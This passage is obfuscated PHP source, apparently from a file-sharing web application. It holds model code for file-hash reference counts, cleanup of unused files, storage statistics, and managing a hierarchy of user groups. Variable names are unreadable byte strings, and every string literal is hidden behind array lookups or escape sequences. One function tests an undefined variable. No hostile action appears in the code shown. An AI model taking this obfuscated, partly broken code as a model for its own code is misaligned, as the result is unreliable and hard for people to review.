$Ô¶œÆ·Ù =& $_SERVER[ĞÆÏ¡Îª]; if (!$şª›‘®¬) { return; } if (!is_array($şª›‘®¬)) { $şª›‘®¬ = array($şª›‘®¬); } $ÙÍôˆŒÏ = array(); foreach ($şª›‘®¬ as $ú¯­ÖË) { $×á§ĞÄ  = $ú¯­ÖË . $Ô¶œÆ·Ù[12]; if (!$ÙÍôˆŒÏ[$×á§ĞÄ ]) { $ÙÍôˆŒÏ[$×á§ĞÄ ] = 0; } $ÙÍôˆŒÏ[$×á§ĞÄ ]++; } $ŒÆ…•¹Í = array(); foreach ($ÙÍôˆŒÏ as $ú¯­ÖË => $ø¶ı£¿º) { $×á§ĞÄ  = $ø¶ı£¿º . $Ô¶œÆ·Ù[12]; if (!$ŒÆ…•¹Í[$×á§ĞÄ ]) { $ŒÆ…•¹Í[$×á§ĞÄ ] = array(); } $ŒÆ…•¹Í[$×á§ĞÄ ][] = $ú¯­ÖË; } foreach ($ŒÆ…•¹Í as $ø¶ı£¿º => $ïÀöî) { if (!$ïÀöî) { continue; } $ø¶ı£¿º = $©ÈÆ‰«î ? $ø¶ı£¿º : -intval($ø¶ı£¿º); $¾ò×¡Ç = array($Ô¶œÆ·Ù[477] => array($Ô¶œÆ·Ù[7], $ïÀöî)); if ($ø¶ı£¿º < 0) { $¾ò×¡Ç[$Ô¶œÆ·Ù[1887]] = array($Ô¶œÆ·Ù[1006], abs($ø¶ı£¿º)); } $this->where($¾ò×¡Ç)->setAdd($Ô¶œÆ·Ù[1887], $ø¶ı£¿º); } } public function findByHash($„„ä«, $öÚË°Ÿß = false) { $Ããœ¿Œ =& $_SERVER[ĞÆÏ¡Îª]; if (!$„„ä« && !$öÚË°Ÿß) { return !1; } $÷¬©ÍÉ˜ = array($Ããœ¿Œ[1881] => $„„ä«); if ($öÚË°Ÿß) { $÷¬©ÍÉ˜ = array($Ããœ¿Œ[1882] => $öÚË°Ÿß); } return $this->order($Ããœ¿Œ[1888])->where($÷¬©ÍÉ˜)->find(); } public function clearEmpty($Ì¬¥´–Ë = 0) { $±ıã¼È˜ =& $_SERVER[ĞÆÏ¡Îª]; $®˜â¥ğÚ = time() - 3600 * 24 * $Ì¬¥´–Ë; $¢÷¡üè = $±ıã¼È˜[1889] . $®˜â¥ğÚ; $Ê¡‘æÓò = $this->where($¢÷¡üè)->select(); if (!$Ê¡‘æÓò) { return; } $´ø¨Ä˜Á = new Task($±ıã¼È˜[1890], $±ıã¼È˜[12], count($Ê¡‘æÓò)); foreach ($Ê¡‘æÓò as $İ…ßÕ¡¢) { $´ø¨Ä˜Á->update(1); $this->resetFile($İ…ßÕ¡¢); } $´ø¨Ä˜Á->end(); } public function resetFile($¼­·ü—Û) { $¿ŠÇ‡ºµ =& $_SERVER[ĞÆÏ¡Îª]; $†Î¿™®• = array($¿ŠÇ‡ºµ[478] => $¼­·ü—Û[$¿ŠÇ‡ºµ[477]]); $Ø”ô€…º = Model($¿ŠÇ‡ºµ[1318])->where($†Î¿™®•)->count(); $ËËÁ›û™ = Model($¿ŠÇ‡ºµ[1891])->where($†Î¿™®•)->count(); $›º¨„¢Ø = intval($Ø”ô€…º) + intval($ËËÁ›û™); if ($›º¨„¢Ø == 0) { IO::remove($¼­·ü—Û[$¿ŠÇ‡ºµ[84]]); Model($¿ŠÇ‡ºµ[1892])->delete($¼­·ü—Û[$¿ŠÇ‡ºµ[477]]); $this->where($†Î¿™®•)->delete(); $this->metaSet($¼­·ü—Û[$¿ŠÇ‡ºµ[477]], null, null); return; } if ($¼­·ü—Û[$¿ŠÇ‡ºµ[1887]] != $›º¨„¢Ø) { $this->where($†Î¿™®•)->save(array($¿ŠÇ‡ºµ[1880] => $›º¨„¢Ø)); } } public function storageInfo($¢øÄç¦€ = false) { $ğ¸ñ¾ñ‡ =& $_SERVER[ĞÆÏ¡Îª]; $Ù‹¨˜ÊÈ = $this->count() + 0.0; $“»Å¬‚ó = 0; $¸š¦ˆ•‡ = 1; $Èäšø›› = 0; $Ö®ÓÄÉ® = 5000; for ($ı¸”ë€‚ = 0; $ı¸”ë€‚ < $Ù‹¨˜ÊÈ; $ı¸”ë€‚ = $ı¸”ë€‚ + $Ö®ÓÄÉ®) { $êŞŒ©±½ = $this->limit($ı¸”ë€‚, $ı¸”ë€‚ + $Ö®ÓÄÉ®)->select(); foreach ($êŞŒ©±½ as $â½Å¸ø£) { $¸š¦ˆ•‡ += $â½Å¸ø£[$ğ¸ñ¾ñ‡[76]] * $â½Å¸ø£[$ğ¸ñ¾ñ‡[1887]]; $“»Å¬‚ó += $â½Å¸ø£[$ğ¸ñ¾ñ‡[76]] * ($â½Å¸ø£[$ğ¸ñ¾ñ‡[1887]] - 1); $Èäšø›› += $â½Å¸ø£[$ğ¸ñ¾ñ‡[1887]]; } } $ÜüâÎŸË = array($ğ¸ñ¾ñ‡[1893] => $¸š¦ˆ•‡, $ğ¸ñ¾ñ‡[1894] => $“»Å¬‚ó, $ğ¸ñ¾ñ‡[1895] => $“»Å¬‚ó / $¸š¦ˆ•‡, $ğ¸ñ¾ñ‡[80] => $Ù‹¨˜ÊÈ, $ğ¸ñ¾ñ‡[1896] => $Èäšø››); return $ÜüâÎŸË; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\155\x65" => "\147\162\x6f\165\160\x5f\x6d\x65\x74\141", "\x6d\145\x74\141\x46\x69\145\154\144" => "\x67\x72\157\x75\x70\x49\104"); protected function cacheFunctionAlias($öÓ¹ïà‹) { $±ì„ßß‡ =& $_SERVER[ĞÆÏ¡Îª]; return array($±ì„ßß‡[1897] => array($öÓ¹ïà‹[0], $±ì„ßß‡[1898]), $±ì„ßß‡[1899] => array($öÓ¹ïà‹[0], $±ì„ßß‡[1900])); } protected function getInfo($½‚ëÀŞ», $úóÌ™¿£ = false) { $ÖæİÇÕê = $this->getInfoSimple($½‚ëÀŞ»); if (!$ÖæİÇÕê) { return !1; } if ($úóÌ™¿£) { return $this->_listDataApplyItem($ÖæİÇÕê); } return $this->cacheFunctionGet($_SERVER[ĞÆÏ¡Îª][1901], $½‚ëÀŞ»); } protected function getInfoSimple($—ŒãÄ™, $Ç¶ÄŸ– = false) { $Ú±ÛÆ =& $_SERVER[ĞÆÏ¡Îª]; if ($Ç¶ÄŸ–) { $”Ğ´¹™¡ = array($Ú±ÛÆ[1819] => intval($—ŒãÄ™)); $¢üò·È = $this->where($”Ğ´¹™¡)->find(); return is_array($¢üò·È) ? $¢üò·È : array(); } return $this->cacheFunctionGet($Ú±ÛÆ[1902], $—ŒãÄ™); } protected function groupAdd($ğø´íéô) { $ ıúøèÅ =& $_SERVER[ĞÆÏ¡Îª]; if (!$ğø´íéô[$ ıúøèÅ[441]] && isset($ğø´íéô[$ ıúøèÅ[1819]]) && $ğø´íéô[$ ıúøèÅ[1819]] == 1) { if ($ìÏŞæ = $this->getInfoSimple($ğø´íéô[$ ıúøèÅ[1819]], !0)) { return $ğø´íéô[$ ıúøèÅ[1819]]; } } else { $ìÏŞæ = $this->getInfoSimple($ğø´íéô[$ ıúøèÅ[441]]); if (!$ìÏŞæ) { return !1; } } $¿ïâ²ï× = $ ıúøèÅ[540]; if ($ìÏŞæ[$ ıúøèÅ[530]]) { $¿ïâ²ï× = $ìÏŞæ[$ ıúøèÅ[530]] . $ìÏŞæ[$ ıúøèÅ[1819]] . $ ıúøèÅ[50]; } $åî²ß¦Ç = array($ ıúøèÅ[429] => $this->groupNameAuto($ğø´íéô[$ ıúøèÅ[441]], $ğø´íéô[$ ıúøèÅ[32]]), $ ıúøèÅ[410] => $ğø´íéô[$ ıúøèÅ[441]], $ ıúøèÅ[599] => $¿ïâ²ï×, $ ıúøèÅ[1903] => $ğø´íéô[$ ıúøèÅ[1806]], $ ıúøèÅ[1904] => 0, $ ıúøèÅ[1823] => 0); if (isset($ğø´íéô[$ ıúøèÅ[1843]])) { $åî²ß¦Ç[$ ıúøèÅ[1843]] = $ğø´íéô[$ ıúøèÅ[1843]]; } else { $„æõì§± = $this->max($ ıúøèÅ[1843]); if (!$„æõì§±) { $„æõì§± = 0; } $åî²ß¦Ç[$ ıúøèÅ[1843]] = $„æõì§± + 1; } if (!empty($ğø´íéô[$ ıúøèÅ[1819]])) { $åî²ß¦Ç[$ ıúøèÅ[1819]] = $ğø´íéô[$ ıúøèÅ[1819]]; } $ú¥†˜½• = $this->add($åî²ß¦Ç); $this->setNamePinyin($ú¥†˜½•, $åî²ß¦Ç[$ ıúøèÅ[32]]); if (isset($ğø´íéô[$ ıúøèÅ[1905]])) { $this->metaSet($ú¥†˜½•, array($ ıúøèÅ[1905] => $ğø´íéô[$ ıúøèÅ[1905]], $ ıúøèÅ[1906] => $ğø´íéô[$ ıúøèÅ[1906]])); unset($ğø´íéô[$ ıúøèÅ[1905]]); unset($ğø´íéô[$ ıúøèÅ[1906]]); } Model($ ıúøèÅ[1318])->groupRootAdd($ú¥†˜½•); return $ú¥†˜½•; } protected function groupEdit($Ê‡¥ŸµÄ, $»„ù¶¦) { $â‰ë·¥ =& $_SERVER[ĞÆÏ¡Îª]; $ÙëÖµ¸Ã = $this->getInfoSimple($Ê‡¥ŸµÄ); if (!$ÙëÖµ¸Ã) { return !1; } if (!empty($»„ù¶¦[$â‰ë·¥[441]])) { $ÓÅïäÓé = $this->getInfoSimple($»„ù¶¦[$â‰ë·¥[441]]); if (!$ÓÅïäÓé) { return !1; } if ($ÙëÖµ¸Ã[$â‰ë·¥[1819]] == $ÓÅïäÓé[$â‰ë·¥[1819]]) { return !1; } if ($»„ù¶¦[$â‰ë·¥[441]] != $ÙëÖµ¸Ã[$â‰ë·¥[441]]) { if ($ÓÅïäÓé[$â‰ë·¥[530]] !== $ÙëÖµ¸Ã[$â‰ë·¥[530]] && strpos($ÓÅïäÓé[$â‰ë·¥[530]], $ÙëÖµ¸Ã[$â‰ë·¥[530]] . $ÙëÖµ¸Ã[$â‰ë·¥[1819]] . $â‰ë·¥[50]) === 0) { return !1; } $»„ù¶¦[$â‰ë·¥[599]] = $ÓÅïäÓé[$â‰ë·¥[530]] . $»„ù¶¦[$â‰ë·¥[441]] . $â‰ë·¥[50]; $this->_changeChildLevel($ÙëÖµ¸Ã, $ÓÅïäÓé); } } if (isset($»„ù¶¦[$â‰ë·¥[32]])) { $this->setNamePinyin($Ê‡¥ŸµÄ, $»„ù¶¦[$â‰ë·¥[32]]); } if (isset($»„ù¶¦[$â‰ë·¥[1905]])) { $this->metaSet($Ê‡¥ŸµÄ, array($â‰ë·¥[1905] => $»„ù¶¦[$â‰ë·¥[1905]], $â‰ë·¥[1906] => $»„ù¶¦[$â‰ë·¥[1906]])); unset($»„ù¶¦[$â‰ë·¥[1905]]); unset($»„ù¶¦[$â‰ë·¥[1906]]); } $this->_clearChildrenCache($ÙëÖµ¸Ã); return $this->where(array($â‰ë·¥[1907] => $Ê‡¥ŸµÄ))->save($»„ù¶¦); } private function _clearChildrenCache($÷„ò¯İ®) { $Â†ÇöÏ =& $_SERVER[ĞÆÏ¡Îª]; $‡ëêŞøÎ = array($Â†ÇöÏ[599] => array($Â†ÇöÏ[559], $÷„ò¯İ®[$Â†ÇöÏ[530]] . $÷„ò¯İ®[$Â†ÇöÏ[1819]] . $Â†ÇöÏ[560])); $ÅåŠï = $this->field($Â†ÇöÏ[1819])->where($‡ëêŞøÎ)->select(); foreach ($ÅåŠï as $¿ŞôîÓ) { $this->_clearCache($¿ŞôîÓ[$Â†ÇöÏ[1819]]); } } private function _clearCache($ÂŒ•ğ‚¬) { $ÓÉí‡¦ =& $_SERVER[ĞÆÏ¡Îª]; $this->cacheFunctionClear($ÓÉí‡¦[1901], $ÂŒ•ğ‚¬); $this->cacheFunctionClear($ÓÉí‡¦[1902], $ÂŒ•ğ‚¬); } private function _changeChildLevel($‘±û¾ïã, $Â±”åğ, $ì—¸İçŠ = false) { $ÍË¾ñÖŸ =& $_SERVER[ĞÆÏ¡Îª]; $ãƒÀøŞõ = $‘±û¾ïã[$ÍË¾ñÖŸ[530]] . $‘±û¾ïã[$ÍË¾ñÖŸ[1819]] . $ÍË¾ñÖŸ[50]; $îÓæÛàŠ = $Â±”åğ[$ÍË¾ñÖŸ[530]] . $Â±”åğ[$ÍË¾ñÖŸ[1819]] . $ÍË¾ñÖŸ[50] . $‘±û¾ïã[$ÍË¾ñÖŸ[1819]] . $ÍË¾ñÖŸ[50]; if ($ì—¸İçŠ) { $îÓæÛàŠ = $Â±”åğ[$ÍË¾ñÖŸ[530]] . $Â±”åğ[$ÍË¾ñÖŸ[1819]] . $ÍË¾ñÖŸ[50]; } $Ü‘„ˆŞ© = array($ÍË¾ñÖŸ[599] => array($ÍË¾ñÖŸ[559], $‘±û¾ïã[$ÍË¾ñÖŸ[530]] . $‘±û¾ïã[$ÍË¾ñÖŸ[1819]] . $ÍË¾ñÖŸ[560])); $ã¨ù•² = array($ÍË¾ñÖŸ[599] => array($ÍË¾ñÖŸ[608], "\162\145\160\x6c\x61\143\x65\50\x70\x61\x72\145\156\x74\x4c\x65\x76\145\154\x2c\47{$ãƒÀøŞõ}\47\54\x27{$îÓæÛàŠ}\x27\x29")); $this->_clearChildrenCache($‘±û¾ïã); $this->where($Ü‘„ˆŞ©)->data($ã¨ù•²)->save(); } public function setNamePinyin($àì°ÇÜÎ, $éëôàÆş = false) { $êäÆç¦Ú =& $_SERVER[ĞÆÏ¡Îª]; if (!$éëôàÆş) { $È¯ĞÖ©š = $this->getInfoSimple($àì°ÇÜÎ); $éëôàÆş = $È¯ĞÖ©š[$êäÆç¦Ú[32]]; } if (!Input::check($éëôàÆş, $êäÆç¦Ú[602])) { $this->metaSet($àì°ÇÜÎ, $êäÆç¦Ú[474], null); $this->metaSet($àì°ÇÜÎ, $êäÆç¦Ú[473], null); return; } $ŞúÔ³» = array($êäÆç¦Ú[474] => str_replace($êäÆç¦Ú[53], $êäÆç¦Ú[12], Pinyin::get($éëôàÆş)), $êäÆç¦Ú[473] => Pinyin::get($éëôàÆş, $êäÆç¦Ú[603])); $this->metaSet($àì°ÇÜÎ, $ŞúÔ³»); } protected function groupStatus($äüğ¡, $„¢Óìİâ) { $±¾‡Ñ·£ =& $_SERVER[ĞÆÏ¡Îª]; $´½¼š¿Š = $this->getInfoSimple($äüğ¡); if (!$´½¼š¿Š) { return !1; } if ($„¢Óìİâ == $±¾‡Ñ·£[88]) { $³¨ö¦é = $this->parentLevelArray($´½¼š¿Š[$±¾‡Ñ·£[530]]); } else { $ş¿îºãœ = array($±¾‡Ñ·£[599] => array($±¾‡Ñ·£[559], $´½¼š¿Š[$±¾‡Ñ·£[530]] . $´½¼š¿Š[$±¾‡Ñ·£[1819]] . $±¾‡Ñ·£[560])); $³¨ö¦é = $this->where($ş¿îºãœ)->field($±¾‡Ñ·£[1819])->select(); $³¨ö¦é = array_to_keyvalue($³¨ö¦é, $±¾‡Ñ·£[12], $±¾‡Ñ·£[1819]); } $³¨ö¦é[] = $´½¼š¿Š[$±¾‡Ñ·£[1819]]; $„”™€½ = array(); foreach ($³¨ö¦é as $äüğ¡) { $„”™€½[] = array($±¾‡Ñ·£[1819] => $äüğ¡, $±¾‡Ñ·£[94] => $±¾‡Ñ·£[745], $±¾‡Ñ·£[383] => $„¢Óìİâ); $this->_clearCache($äüğ¡); } return Model($±¾‡Ñ·£[1908])->addAll($„”™€½, array(), !0); } protected function groupRemove($â ë ¼, $Ä¾½™‘ = false) { $áŠ÷°Ú =& $_SERVER[ĞÆÏ¡Îª]; $ø²¿ÈØñ = array($áŠ÷°Ú[1819] => $â ë ¼); $ÉŠ…óÎ = $this->where($ø²¿ÈØñ)->find(); if (!$ÉŠ…óÎ || $ÉŠ…óÎ[$áŠ÷°Ú[441]] == 0) { return !1; } if (!$Ä¾½™‘) { $Úêñ‘Æ = $this->getInfoSimple($ÉŠ…óÎ[$áŠ÷°Ú[441]]); $this->_changeChildLevel($ÉŠ…óÎ, $Úêñ‘Æ, !0); $this->where(array($áŠ÷°Ú[441] => $â ë ¼))->save(array($áŠ÷°Ú[441] => $ÉŠ…óÎ[$áŠ÷°Ú[441]])); } Model($áŠ÷°Ú[1908])->where($ø²¿ÈØñ)->delete(); Model($áŠ÷°Ú[1909])->where($ø²¿ÈØñ)->delete(); Model($áŠ÷°Ú[820])->groupRootRemove($â ë ¼); return $this->where($ø²¿ÈØñ)->delete(); } protected function groupSort($Ì®æèà) { $È°‚ì›… =& $_SERVER[ĞÆÏ¡Îª]; $€ş•ÇáÒ = array(); foreach ($Ì®æèà as $ƒş¿¥İ => $¹–¨×‰œ) { $€ş•ÇáÒ[] = array($È°‚ì›…[1819], $¹–¨×‰œ, $È°‚ì›…[1843], $ƒş¿¥İ + 1); } $this->saveAll($€ş•ÇáÒ); } public function listData() { $¶´‚öÂ´ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¶´‚öÂ´[$_SERVER[ĞÆÏ¡Îª][378]]); return $¶´‚öÂ´; } private function _makeOrder($³¥ô‹ÆŸ = '') { $©Šõ«º =& $_SERVER[ĞÆÏ¡Îª]; $Ç˜ÊÌÂ = array($©Šõ«º[1819], $©Šõ«º[32], $©Šõ«º[1808], $©Šõ«º[200]); $·•ıüïú = array($©Šõ«º[459] => $©Šõ«º[460], $©Šõ«º[461] => $©Šõ«º[462]); $º­‘¾Éú = Input::get($©Šõ«º[466], $©Šõ«º[7], $©Šõ«º[1823], $Ç˜ÊÌÂ); $€º±Æê¾ = Input::get($©Šõ«º[467], $©Šõ«º[7], $©Šõ«º[1910], array($©Šõ«º[1910], $©Šõ«º[461])); $€º±Æê¾ = $·•ıüïú[$€º±Æê¾]; $³¥ô‹ÆŸ = $³¥ô‹ÆŸ . "{$º­‘¾Éú}\x20{$€º±Æê¾}\54\40\x67\x72\x6f\165\x70\x49\x44\40\141\163\143"; return $this->order($³¥ô‹ÆŸ); } public function listChild($ûì™…Ğü) { $— ¸Ä»ñ =& $_SERVER[ĞÆÏ¡Îª]; $Íé‡Ò‰ = $this->where(array($— ¸Ä»ñ[441] => $ûì™…Ğü))->_makeOrder()->selectPage(200); $this->_listDataApply($Íé‡Ò‰[$— ¸Ä»ñ[378]]); return $Íé‡Ò‰; } public function listChildIds($Ê¼é–İ…) { $°±ä£×È =& $_SERVER[ĞÆÏ¡Îª]; if (is_string($¶Ï§œõÒ)) { $Ê¼é–İ… = explode($°±ä£×È[50], $Ê¼é–İ…); } $Ö´¥ôØ½ = $this->where(array($°±ä£×È[1819] => array($°±ä£×È[7], $Ê¼é–İ…)))->field($°±ä£×È[1911])->select(); if (!$Ö´¥ôØ½) { return !1; } $‘†¾ÊîŸ = array(); foreach ($Ö´¥ôØ½ as $ëĞÉ§ìí) { $‘†¾ÊîŸ[] = "\163\x65\154\145\x63\x74\40\147\162\157\x75\160\x49\x44\40\x66\162\x6f\x6d\x20\140\147\162\x6f\x75\160\x60\40\167\150\x65\162\145\40\160\x61\x72\145\156\x74\114\x65\x76\145\x6c\x20\154\151\153\145\40\47{$ëĞÉ§ìí[$°±ä£×È[530]]}{$ëĞÉ§ìí[$°±ä£×È[1819]]}\54\45\x27"; } $‘†¾ÊîŸ = implode($°±ä£×È[1912], $‘†¾ÊîŸ); $Ö´¥ôØ½ = $this->query($‘†¾ÊîŸ); if (!$Ö´¥ôØ½) { return array(); } $Ê¼é–İ… = array_to_keyvalue($Ö´¥ôØ½, $°±ä£×È[12], $°±ä£×È[1819]); return array_unique($Ê¼é–İ…); } public function listByID($¹Óî¦š) { $Ùı¹Ãû =& $_SERVER[ĞÆÏ¡Îª]; if (!$¹Óî¦š) { return array(); } $ÛÖÏâ˜Ì = array($Ùı¹Ãû[1819] => array($Ùı¹Ãû[7], $¹Óî¦š)); $¦»œ¾€’ = $this->where($ÛÖÏâ˜Ì)->select(); $¦»œ¾€’ = array_sort_keep($¦»œ¾€’, $Ùı¹Ãû[1819], $¹Óî¦š); $this->_listDataApply($¦»œ¾€’); return $¦»œ¾€’; } public function listSearch($êşş§ù´) { $öúÔ¾¹„ =& $_SERVER[ĞÆÏ¡Îª]; $‡™ÒÖì = $êşş§ù´[$öúÔ¾¹„[1913]]; $œ²ÛŠÒ¯ = isset($êşş§ù´[$öúÔ¾¹„[1914]]) ? $êşş§ù´[$öúÔ¾¹„[1914]] : !1; if (!trim($‡™ÒÖì)) { return !1; } $‡™ÒÖì = str_replace($öúÔ¾¹„[1915], $öúÔ¾¹„[1916], $‡™ÒÖì); $—Ğ—Éå = array($öúÔ¾¹„[1819] => array($öúÔ¾¹„[391], "{$‡™ÒÖì}\45"), $öúÔ¾¹„[32] => array($öúÔ¾¹„[391], "\45{$‡™ÒÖì}\45"), $öúÔ¾¹„[991] => $öúÔ¾¹„[1917]); if ($œ²ÛŠÒ¯) { $‘‚È›Ïí = $this->getInfoSimple($œ²ÛŠÒ¯); $”§‚Ëì = $‘‚È›Ïí[$öúÔ¾¹„[530]] . $œ²ÛŠÒ¯ . $öúÔ¾¹„[560]; $—Ğ—Éå = array($—Ğ—Éå, array($öúÔ¾¹„[530] => array($öúÔ¾¹„[391], $”§‚Ëì))); } $—Ğ—Éå = $this->parseWhereLike($—Ğ—Éå); $”¾“åÆİ = $this->_makeOrder()->where($—Ğ—Éå)->selectPage(20); $”¾“åÆİ = $”¾“åÆİ ? $”¾“åÆİ : array($öúÔ¾¹„[378] => array(), $öúÔ¾¹„[375] => array()); if (!$”¾“åÆİ || count($”¾“åÆİ[$öúÔ¾¹„[378]]) < 5 && Input::check($‡™ÒÖì, $öúÔ¾¹„[327])) { $ °Âæ‚™ = $this->groupChildrenAll($œ²ÛŠÒ¯); $ˆ”„îúˆ = $this->_searchFromMeta($öúÔ¾¹„[473], $‡™ÒÖì, 10, $ °Âæ‚™); $¤ı¸é™ = $this->_searchFromMeta($öúÔ¾¹„[474], $‡™ÒÖì, 10, $ °Âæ‚™); $üñÚ’£ó = array_merge($ˆ”„îúˆ, $¤ı¸é™, $”¾“åÆİ[$öúÔ¾¹„[378]]); $”¾“åÆİ[$öúÔ¾¹„[378]] = array_unique_by_key($üñÚ’£ó, $öúÔ¾¹„[1819]); $”¾“åÆİ[$öúÔ¾¹„[375]][$öúÔ¾¹„[376]] = count($”¾“åÆİ[$öúÔ¾¹„[378]]); $”¾“åÆİ[$öúÔ¾¹„[375]][$öúÔ¾¹„[377]] = ceil($”¾“åÆİ[$öúÔ¾¹„[375]][$öúÔ¾¹„[376]] / $”¾“åÆİ[$öúÔ¾¹„[375]][$öúÔ¾¹„[372]]); } $this->_listDataApply($”¾“åÆİ[$öúÔ¾¹„[378]]); return $”¾“åÆİ; } protected function groupChildrenAll($ÓùìĞ’Ó) { $ÅÏ÷ë° =& $_SERVER[ĞÆÏ¡Îª]; if (!$ÓùìĞ’Ó) { return !1; } if (is_string($ÓùìĞ’Ó)) { $ÓùìĞ’Ó = array($ÓùìĞ’Ó); } $ÒĞˆ¨Ù× = $ÓùìĞ’Ó; foreach ($ÓùìĞ’Ó as $‘¼¨á¿Ó) { $•±‘«¢§ = $this->getInfoSimple($‘¼¨á¿Ó); $îœØ­Éñ = array($ÅÏ÷ë°[530] => array($ÅÏ÷ë°[391], $•±‘«¢§[$ÅÏ÷ë°[530]] . $‘¼¨á¿Ó . $ÅÏ÷ë°[560])); $ßâƒÜ‰É = $this->field($ÅÏ÷ë°[1819])->where($îœØ­Éñ)->select(); $ÒĞˆ¨Ù× = array_merge($ÒĞˆ¨Ù×, array_to_keyvalue($ßâƒÜ‰É, $ÅÏ÷ë°[12], $ÅÏ÷ë°[1819])); } return array_unique($ÒĞˆ¨Ù×); } private function _searchFromMeta($­¨¥’ïâ, $‡ÛÅ¯­, $Øûú‘®, $Éßêµùı) { $Ù¹Ü¼²“ =& $_SERVER[ĞÆÏ¡Îª]; $‡ÛÅ¯­ = strtolower($‡ÛÅ¯­); $àãï Ò = array($Ù¹Ü¼²“[94] => $­¨¥’ïâ, $Ù¹Ü¼²“[383] => array($Ù¹Ü¼²“[391], "\x25{$‡ÛÅ¯­}\x25")); $àãï Ò = $this->parseWhereLike($àãï Ò); if ($Éßêµùı) { $àãï Ò[$Ù¹Ü¼²“[1819]] = array($Ù¹Ü¼²“[7], $Éßêµùı); } $‘¡×§í… = Model($Ù¹Ü¼²“[1918])->where($àãï Ò)->limit($Øûú‘®)->select(); if (!$‘¡×§í…) { return array(); } $‘¡×§í… = array_to_keyvalue($‘¡×§í…, $Ù¹Ü¼²“[12], $Ù¹Ü¼²“[1819]); $‚­Ÿ°¯ = $this->where(array($Ù¹Ü¼²“[1907] => array($Ù¹Ü¼²“[7], $‘¡×§í…)))->select(); if (!$‚­Ÿ°¯) { return array(); } return $‚­Ÿ°¯; } protected function _listDataApplyItem($ËØã¦¤á) { $ş™”œÉ = array($ËØã¦¤á); $this->_listDataApply($ş™”œÉ); return $ş™”œÉ[0]; } protected function _listDataApply(&$®Ü‰ëí) { $÷²Ã†Ÿ =& $_SERVER[ĞÆÏ¡Îª]; if (!$®Ü‰ëí) { return; } $¬×Â¥ß™ = array_to_keyvalue($®Ü‰ëí, $÷²Ã†Ÿ[12], $÷²Ã†Ÿ[1819]); $this->_listAppendChildren($®Ü‰ëí); $this->_listAppendChildrenMember($®Ü‰ëí); $this->_listAppendMeta($®Ü‰ëí, $¬×Â¥ß™); $this->_listAppendParent($®Ü‰ëí); $this->_listAppendSourceRoot($®Ü‰ëí, $¬×Â¥ß™); } private function _listAppendChildren(&$ÊÜçŸÛ’) { $×î‰„¦‘ =& $_SERVER[ĞÆÏ¡Îª]; $¾ã´ŒÓş = array_to_keyvalue($ÊÜçŸÛ’, $×î‰„¦‘[12], $×î‰„¦‘[1819]); $À¿¢ã¦î = array($×î‰„¦‘[441] => array($×î‰„¦‘[7], $¾ã´ŒÓş)); $èğÙ³á = array($×î‰„¦‘[441], $×î‰„¦‘[1919] => $×î‰„¦‘[509]); $ÜÁïå  = $this->field($èğÙ³á)->where($À¿¢ã¦î)->group($×î‰„¦‘[441])->select(); $¼ĞïÄÛ¾ = array_to_keyvalue($ÜÁïå , $×î‰„¦‘[441], $×î‰„¦‘[509]); foreach ($ÊÜçŸÛ’ as &$ë¥Øß»Š) { $¿ÀûèÜ˜ = $ë¥Øß»Š[$×î‰„¦‘[1819]]; $ë¥Øß»Š[$×î‰„¦‘[1920]] = isset($¼ĞïÄÛ¾[$¿ÀûèÜ˜]) ? intval($¼ĞïÄÛ¾[$¿ÀûèÜ˜]) : !1; } unset($ë¥Øß»Š); } private function _listAppendChildrenMember(&$·Àıœèİ) { $ßÈ§˜ç =& $_SERVER[ĞÆÏ¡Îª]; $ÆÈÃ¦Ãõ = array_to_keyvalue($·Àıœèİ, $ßÈ§˜ç[12], $ßÈ§˜ç[1819]); $‹¹æ™¤ = array($ßÈ§˜ç[1819] => array($ßÈ§˜ç[7], $ÆÈÃ¦Ãõ)); $ğó¶šŸÍ = array($ßÈ§˜ç[1819], $ßÈ§˜ç[1919] => $ßÈ§˜ç[509]); $•Ñ’­£— = Model($ßÈ§˜ç[1909])->field($ğó¶šŸÍ)->where($‹¹æ™¤)->group($ßÈ§˜ç[1819])->select(); $ˆì¶´•Ç = array_to_keyvalue($•Ñ’­£—, $ßÈ§˜ç[1819], $ßÈ§˜ç[509]); foreach ($·Àıœèİ as &$û’¤äÙ) { $ÜëÂÏ‚Ã = $û’¤äÙ[$ßÈ§˜ç[1819]]; $û’¤äÙ[$ßÈ§˜ç[1921]] = isset($ˆì¶´•Ç[$ÜëÂÏ‚Ã]) ? intval($ˆì¶´•Ç[$ÜëÂÏ‚Ã]) : !1; } unset($û’¤äÙ); } private function _listAppendMeta(&$üŠ¨İ»Ş, $ıêÚÌ¡Ğ) { $½€³‡å =& $_SERVER[ĞÆÏ¡Îª]; $ÙÖ‰úëï = array($½€³‡å[1819] => array($½€³‡å[7], $ıêÚÌ¡Ğ)); $ÖÉıë„ç = Model($½€³‡å[1908])->where($ÙÖ‰úëï)->select(); $ÖÉıë„ç = array_to_keyvalue_group($ÖÉıë„ç, $½€³‡å[1819]); foreach ($ÖÉıë„ç as &$Š“¸Ñ—) { $Š“¸Ñ— = array_to_keyvalue($Š“¸Ñ—, $½€³‡å[94], $½€³‡å[383]); } unset($Š“¸Ñ—); foreach ($üŠ¨İ»Ş as &$åµÜ¹ĞÈ) { $åµÜ¹ĞÈ[$½€³‡å[475]] = array(); if (isset($ÖÉıë„ç[$åµÜ¹ĞÈ[$½€³‡å[1819]]])) { $åµÜ¹ĞÈ[$½€³‡å[475]] = $ÖÉıë„ç[$åµÜ¹ĞÈ[$½€³‡å[1819]]]; } } unset($åµÜ¹ĞÈ); } protected function parentLevelArray($¸ä¤­ÔÖ) { $“‚ó«Ä« =& $_SERVER[ĞÆÏ¡Îª]; $¸ä¤­ÔÖ = explode($“‚ó«Ä«[50], trim($¸ä¤­ÔÖ, $“‚ó«Ä«[50])); $¸ä¤­ÔÖ = array_remove_value($¸ä¤­ÔÖ, $“‚ó«Ä«[197]); return $¸ä¤­ÔÖ; } protected function parentInGroup($İ“â°Ã¶, $±†ƒ†²) { $éÈ¾Ç„Ã =& $_SERVER[ĞÆÏ¡Îª]; $Ñ¹ÈÖïÀ = $this->getInfoSimple($İ“â°Ã¶); if (!$Ñ¹ÈÖïÀ) { return !0; } $„Ó¿åö = $this->parentLevelArray($Ñ¹ÈÖïÀ[$éÈ¾Ç„Ã[530]]); $„Ó¿åö[] = $İ“â°Ã¶; foreach ($„Ó¿åö as $İ“â°Ã¶) { if (in_array($İ“â°Ã¶ . $éÈ¾Ç„Ã[12], $±†ƒ†²)) { return !0; } } return !1; } private function 